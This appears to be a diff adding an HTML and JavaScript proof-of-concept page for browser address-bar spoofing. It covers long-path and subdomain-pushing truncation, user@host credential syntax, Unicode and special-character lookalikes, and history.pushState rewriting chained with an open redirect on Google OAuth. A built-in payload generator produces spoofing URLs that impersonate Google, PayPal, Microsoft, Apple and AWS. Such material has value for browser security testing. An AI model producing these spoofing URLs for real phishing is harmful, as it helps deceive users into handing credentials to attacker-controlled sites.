@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Omnibox / URL Eliding / Truncation PoC</title>
+<style>
+  body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; padding: 30px; }
+  h1 { color: #f0883e; }
+  .meta { color: #8b949e; margin-bottom: 24px; font-size: 14px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 16px 0; }
+  h3 { color: #58a6ff; margin-bottom: 10px; }
+  pre { background: #0d1117; padding: 14px; border-radius: 6px; font-size: 12px; color: #c9d1d9; overflow-x: auto; white-space: pre-wrap; }
+  .btn { padding: 10px 18px; background: #238636; color: white; border: none; border-radius: 6px;
+         cursor: pointer; font-size: 13px; margin-right: 8px; margin-top: 8px; }
+  .btn.b { background: #1f6feb; }
+  .btn.r { background: #da3633; }
+  .btn.p { background: #9333ea; }
+  .log { background: #0d1117; border-radius: 6px; padding: 12px; margin-top: 12px; font-family: monospace;
+         font-size: 12px; min-height: 50px; max-height: 200px; overflow-y: auto; }
+  .url-sim { background: #f1f3f4; color: #202124; padding: 10px 16px; border-radius: 20px;
+             font-family: monospace; font-size: 14px; white-space: nowrap; overflow: hidden;
+             text-overflow: ellipsis; border: 1px solid #dadce0; display: flex; align-items: center; }
+  .url-lock { color: #1a73e8; margin-right: 8px; }
+  .url-origin { font-weight: bold; color: #202124; }
+  .url-path { color: #5f6368; }
+  .url-trunc { color: #bbb; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { background: #21262d; padding: 8px 12px; text-align: left; color: #8b949e; }
+  td { padding: 8px 12px; border-bottom: 1px solid #21262d; font-family: monospace; }
+  .vuln { color: #f85149; }
+  .safe { color: #3fb950; }
+  .maybe { color: #e3b341; }
+</style>
+</head>
+<body>
+<h1>📏 Omnibox Eliding & URL Truncation PoC</h1>
+<div class="meta">URL truncation · Path confusion · Long subdomain attacks · Mobile address bar</div>
+
+<div class="card">
+  <h3>How URL Eliding Works</h3>
+  <p style="color:#8b949e;font-size:13px;line-height:1.7">
+    Browsers have limited address bar width. Long URLs are truncated ("elided") with "...".
+    Chrome specifically elides the path/query and emphasizes only the <strong>eTLD+1</strong> (registered domain).
+    Bugs occur when: the eTLD+1 detection is wrong, special characters confuse the parser,
+    or truncation hides the real domain.
+  </p>
+
+  <!-- Visual URL simulation -->
+  <div style="margin-top:16px">
+    <div style="color:#8b949e;font-size:12px;margin-bottom:8px">What Chrome shows (eTLD+1 emphasis):</div>
+    <div class="url-sim">
+      <span class="url-lock">🔒</span>
+      <span class="url-origin">google.com</span>
+    </div>
+    <div style="color:#8b949e;font-size:11px;margin-top:4px">← Real URL: https://accounts.google.com/o/oauth2/auth?client_id=... (path hidden)</div>
+  </div>
+
+  <div style="margin-top:12px">
+    <div style="color:#8b949e;font-size:12px;margin-bottom:8px">Attack: long subdomain to push real domain off-screen</div>
+    <div class="url-sim" style="max-width:350px">
+      <span class="url-lock">🔒</span>
+      <span class="url-path" style="color:#202124">accounts.google.com.very-long-subdomain-that-pushes-origin-off-sc...</span>
+    </div>
+    <div style="color:#8b949e;font-size:11px;margin-top:4px">← Real: evil.com — but the visible text starts with "accounts.google.com"</div>
+  </div>
+</div>
+
+<!-- Test techniques -->
+<div class="card">
+  <h3>Technique 1: Long Path Confusion</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Use a very long URL path that causes the browser to truncate, hiding the actual domain structure.
+    The visible portion looks like a trusted URL.
+  </p>
+  <pre>// URLs that can confuse truncation:
+// Real URL: https://evil.com/https://google.com/login?fake=long-parameter
+// Shown as: https://evil.com/https://google...  ← user sees "google" in URL
+
+// Or: subdomain confusable
+// https://google.com.evil-domain.com/long-path-here...
+// Browser eTLD+1 logic:
+// Chrome emphasizes "evil-domain.com" (correct)
+// But: some browsers may truncate from left and show "...google.com..." in path</pre>
+  <button class="btn" onclick="testLongPath()">▶ Test Long Path</button>
+  <div class="log" id="log1">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 2: Subdomain Pushing Attack</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Use a very long trusted-looking subdomain. On narrow address bars (mobile!), the real domain
+    scrolls off-screen and the user only sees the trusted-looking prefix.
+  </p>
+  <pre>// Attack URL (on mobile — narrow address bar):
+// https://accounts.google.com.very-long-subdomain-name-here.evil.com/
+//
+// Mobile address bar (300px wide) shows:
+// 🔒 accounts.google.com.very-long-...
+//    ^^^^ user sees this ^^^^
+// But the actual eTLD+1 is evil.com
+//
+// Works when: browser address bar is narrow AND mobile scroll behavior
+// creates a window where only the start of the URL is visible.</pre>
+  <button class="btn b" onclick="testSubdomainPush()">▶ Test Subdomain Push</button>
+  <div class="log" id="log2">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 3: User@Host Confusion (Credential Syntax)</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    URLs support user:password@host syntax. Putting a trusted domain in the "user" part makes
+    the address bar potentially show the trusted domain. Modern browsers strip this for HTTP(S)
+    but some edge cases remain.
+  </p>
+  <pre>// Format: https://user:pass@host/path
+// Attack: https://google.com@evil.com/
+// → user = "google.com", host = "evil.com"
+// Modern Chrome: shows warning / strips credentials
+// Old browsers: showed "google.com" in URL display
+// Test mobile browsers: Samsung Internet, UC Browser, Opera Mini
+
+// Also test:
+// https://google.com%40evil.com/        (URL-encoded @)
+// https://google.com%2540evil.com/      (double-encoded)
+// https://google.com:evil.com@host/     (colon confusion)</pre>
+  <button class="btn r" onclick="testCredentialSyntax()">▶ Test Credential Syntax</button>
+  <div class="log" id="log3">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 4: Special Characters in URL</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Special characters can confuse URL parsers and display logic.
+    Some characters cause the browser to display a different portion of the URL.
+  </p>
+  <pre>// Null byte in URL (some old parsers stop at null):
+// https://evil.com%00google.com
+// → displayed: "evil.com" but parser stops and shows nothing after %00
+
+// Slash confusion:
+// https://google.com\@evil.com/    (backslash as separator)
+// https://google.com%5c@evil.com/  (URL-encoded backslash)
+
+// Fragment confusion:
+// https://evil.com#https://google.com/login
+// → fragment shown in bar? Some mobile bars show fragment text
+
+// Unicode punctuation lookalikes:
+// https://evil.com／google.com  (U+FF0F fullwidth slash)
+// https://evil․com              (U+2024 one dot leader as period)</pre>
+  <button class="btn p" onclick="testSpecialChars()">▶ Test Special Chars</button>
+  <div class="log" id="log4">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 5: history.pushState URL Confusion</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Use history.pushState to change the displayed URL path to something misleading.
+    Works same-origin only, but combined with open redirect = cross-origin attack.
+  </p>
+  <pre>// Same-origin: change URL display
+history.pushState({}, '', '/google.com/login?spoofed=true');
+// Address bar shows: current-origin.com/google.com/login
+// User might see: ".../google.com/login" and think it's Google
+
+// Combined with open redirect:
+// 1. Find: https://accounts.google.com/o/oauth2/auth?redirect_uri=ANY_URL
+// 2. Navigate there: window.open('https://accounts.google.com/o/oauth2/auth?redirect_uri=https://evil.com')
+// 3. Landing on evil.com: history.pushState({}, '', '/signin/v2/identifier')
+// Result: address bar shows https://accounts.google.com/signin (Google!) but serving evil content</pre>
+  <button class="btn" onclick="testPushState()">▶ Test pushState Confusion</button>
+  <button class="btn b" onclick="restoreURL()">Restore URL</button>
+  <div class="log" id="log5">Ready...</div>
+</div>
+
+<!-- Payload generator -->
+<div class="card">
+  <h3>⚙️ URL Confusion Payload Generator</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Enter trusted domain and attacker domain to generate confusion payloads:
+  </p>
+  <div style="display:flex;gap:12px;margin-bottom:12px">
+    <div style="flex:1">
+      <div style="color:#8b949e;font-size:12px;margin-bottom:4px">Trusted domain (to spoof):</div>
+      <input type="text" id="trustedDomain" placeholder="google.com" value="google.com"
+             style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:10px;border-radius:6px;width:100%;box-sizing:border-box">
+    </div>
+    <div style="flex:1">
+      <div style="color:#8b949e;font-size:12px;margin-bottom:4px">Attacker domain:</div>
+      <input type="text" id="attackerDomain" placeholder="evil.com" value="evil.com"
+             style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:10px;border-radius:6px;width:100%;box-sizing:border-box">
+    </div>
+  </div>
+  <button class="btn" onclick="generatePayloads()">Generate Payloads</button>
+  <div class="log" id="payloadLog">Click to generate URL confusion payloads...</div>
+</div>
+
+<!-- Browser behavior matrix -->
+<div class="card">
+  <h3>Browser URL Display Behavior Matrix</h3>
+  <table>
+    <tr><th>Browser</th><th>eTLD+1 Emphasis</th><th>Credential Stripping</th><th>Mobile Bar</th></tr>
+    <tr>
+      <td>Chrome (desktop)</td>
+      <td class="safe">Shows only eTLD+1</td>
+      <td class="safe">Strips user:pass</td>
+      <td class="maybe">Auto-hides on scroll</td>
+    </tr>
+    <tr>
+      <td>Chrome (Android)</td>
+      <td class="safe">eTLD+1 emphasis</td>
+      <td class="safe">Strips user:pass</td>
+      <td class="vuln">Small bar, heavy elision</td>
+    </tr>
+    <tr>
+      <td>Firefox (desktop)</td>
+      <td class="maybe">Shows full URL</td>
+      <td class="safe">Strips/warns</td>
+      <td>N/A</td>
+    </tr>
+    <tr>
+      <td>Firefox (Android)</td>
+      <td class="maybe">Truncates from right</td>
+      <td class="safe">Strips/warns</td>
+      <td class="vuln">Very small bar</td>
+    </tr>
+    <tr>
+      <td>Safari (iOS)</td>
+      <td class="maybe">Shows eTLD+1 only</td>
+      <td class="safe">Strips</td>
+      <td class="vuln">Auto-hides aggressively</td>
+    </tr>
+    <tr>
+      <td>Edge (desktop)</td>
+      <td class="safe">Similar to Chrome</td>
+      <td class="safe">Strips</td>
+      <td>N/A</td>
+    </tr>
+    <tr>
+      <td>Brave</td>
+      <td class="safe">Similar to Chrome</td>
+      <td class="safe">Strips</td>
+      <td class="maybe">Custom mobile UI</td>
+    </tr>
+    <tr>
+      <td>Samsung Internet</td>
+      <td class="vuln">May show more of URL</td>
+      <td class="maybe">Varies by version</td>
+      <td class="vuln">Custom bar, lags Chrome</td>
+    </tr>
+    <tr>
+      <td>UC Browser</td>
+      <td class="vuln">Different display logic</td>
+      <td class="vuln">May show credentials</td>
+      <td class="vuln">Very custom UI</td>
+    </tr>
+    <tr>
+      <td>Opera Mini</td>
+      <td class="vuln">Proxy-based — different</td>
+      <td class="maybe">Unknown</td>
+      <td class="vuln">Stripped UI</td>
+    </tr>
+  </table>
+</div>
+
+<script>
+function log(id, msg, color) {
+  const el = document.getElementById('log' + id);
+  el.innerHTML += `<span style="color:${color||'#8b949e'}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function testLongPath() {
+  // Simulate what a confusing long URL looks like
+  const longPath = '/very/long/path/that/looks/like/google.com/login/account/verify/security/check?token=abc&next=https://google.com';
+  const fakeURL = location.origin + longPath;
+
+  log(1, 'Long path URL: ' + fakeURL, '#3fb950');
+  log(1, 'Pushing to history...', '#e3b341');
+
+  const orig = location.href;
+  history.pushState({}, '', longPath);
+  log(1, '✓ Address bar now shows: ' + location.href, '#3fb950');
+  log(1, '→ Notice how "google.com" appears IN the path — confuses some users', '#e3b341');
+
+  setTimeout(() => {
+    history.pushState({}, '', orig);
+    log(1, 'Restored original URL', '#8b949e');
+  }, 4000);
+}
+
+function testSubdomainPush() {
+  const subs = [
+    'accounts.google.com',
+    'secure.paypal.com',
+    'login.microsoftonline.com',
+    'id.apple.com',
+  ];
+
+  log(2, 'On mobile, these URLs start with trusted-looking subdomain:', '#3fb950');
+  subs.forEach(s => {
+    // Create URL that starts with trusted-looking text
+    const confusing = `https://${s}.${location.hostname}/login`;
+    log(2, confusing, '#e3b341');
+  });
+
+  log(2, '\n→ On narrow mobile bar, user sees only the start: "accounts.google.com..."', '#8b949e');
+  log(2, '→ But the actual eTLD+1 is your domain at the end!', '#f85149');
+  log(2, '→ Test this on: Samsung Internet, UC Browser, Opera Mini', '#58a6ff');
+}
+
+function testCredentialSyntax() {
+  const payloads = [
+    'https://google.com@' + location.hostname + '/',
+    'https://google.com%40' + location.hostname + '/',
+    'https://accounts.google.com:80@' + location.hostname + '/login',
+    'https://google.com:password@' + location.hostname + '/',
+  ];
+
+  log(3, 'Credential syntax payloads (open in address bar of each browser):', '#3fb950');
+  payloads.forEach(p => {
+    log(3, p, '#e3b341');
+  });
+  log(3, '\nModern browsers block/warn, but test: Samsung Internet, UC Browser, old Opera', '#8b949e');
+  log(3, 'Also test mobile browsers — they handle this differently from desktop', '#8b949e');
+}
+
+function testSpecialChars() {
+  const host = location.hostname;
+  const payloads = [
+    { url: `https://google.com\\@${host}/`, note: 'Backslash as separator' },
+    { url: `https://google.com%5c@${host}/`, note: 'URL-encoded backslash' },
+    { url: `https://${host}#https://google.com/login`, note: 'Fragment after hash' },
+    { url: `https://${host}/path?next=https://google.com`, note: 'Trusted domain in query param' },
+    { url: `https://evil\u{FF0E}com/`, note: 'Fullwidth period (U+FF0E)' },
+    { url: `https://evil․com/`, note: 'One dot leader (U+2024) as period' },
+  ];
+
+  log(4, 'Special character URL payloads:', '#3fb950');
+  payloads.forEach(p => {
+    log(4, `${p.url}`, '#e3b341');
+    log(4, `  → ${p.note}`, '#8b949e');
+  });
+}
+
+const origURL = location.href;
+function testPushState() {
+  const paths = [
+    '/google.com/accounts/login',
+    '/accounts.google.com/o/oauth2/auth',
+    '/login.microsoftonline.com/common/oauth2/v2.0',
+    '/signin.aws.amazon.com',
+  ];
+
+  log(5, 'Testing history.pushState URL confusion...', '#3fb950');
+  paths.forEach((p, i) => {
+    setTimeout(() => {
+      history.pushState({}, '', p);
+      log(5, `URL bar: ${location.href}`, '#e3b341');
+      if (i === paths.length - 1) {
+        setTimeout(() => {
+          history.pushState({}, '', origURL);
+          log(5, 'Restored', '#8b949e');
+        }, 2000);
+      }
+    }, i * 800);
+  });
+}
+
+function restoreURL() {
+  history.pushState({}, '', origURL);
+  document.getElementById('log5').innerHTML += `<span style="color:#3fb950">URL restored to original</span>\n`;
+}
+
+function generatePayloads() {
+  const trusted = document.getElementById('trustedDomain').value.trim() || 'google.com';
+  const attacker = document.getElementById('attackerDomain').value.trim() || 'evil.com';
+  const el = document.getElementById('payloadLog');
+
+  const payloads = [
+    { url: `https://${trusted}@${attacker}/`, type: 'Credential confusion' },
+    { url: `https://${trusted}.${attacker}/`, type: 'Subdomain of attacker' },
+    { url: `https://${attacker}/${trusted}/login`, type: 'Trusted domain in path' },
+    { url: `https://${attacker}/?redirect=${trusted}`, type: 'Trusted in query param' },
+    { url: `https://${attacker}/#${trusted}/login`, type: 'Trusted in fragment' },
+    { url: `https://${trusted}%40${attacker}/`, type: 'URL-encoded @ sign' },
+    { url: `https://very-long-${trusted}-subdomain-prefix.${attacker}/`, type: 'Long subdomain push (mobile)' },
+    { url: `https://${trusted}\\${attacker}/`, type: 'Backslash separator' },
+    { url: `https://${attacker}/https://${trusted}/login`, type: 'Double scheme in path' },
+  ];
+
+  el.innerHTML = '';
+  payloads.forEach(p => {
+    el.innerHTML += `<span style="color:#58a6ff">${p.type}:</span>\n<span style="color:#e3b341">${p.url}</span>\n\n`;
+  });
+}
+</script>
+</body>
+</html>
